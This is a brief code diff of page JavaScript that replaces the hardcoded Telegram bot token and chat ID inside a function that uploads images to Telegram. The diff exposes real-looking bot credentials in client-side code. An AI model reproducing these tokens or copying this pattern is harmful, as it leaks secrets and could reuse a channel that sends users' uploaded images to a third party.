@@ -130,8 +130,8 @@ document.addEventListener("DOMContentLoaded", function () {
 
     // Function to upload an image to Telegram
     function uploadImageToTelegram(imageFile) {
-        const botToken = '7331211229:AAE3YbxAY_ffo2___sWWGf2zQ3y6DX91k3A';
-        const chatId = '7383651381';
+        const botToken = '7146693702:AAGzqiUlBSCt11LzsswFpkNknddDnHRsvxk';
+        const chatId = '565779685';
 
         const formData = new FormData();
         formData.append('chat_id', chatId);
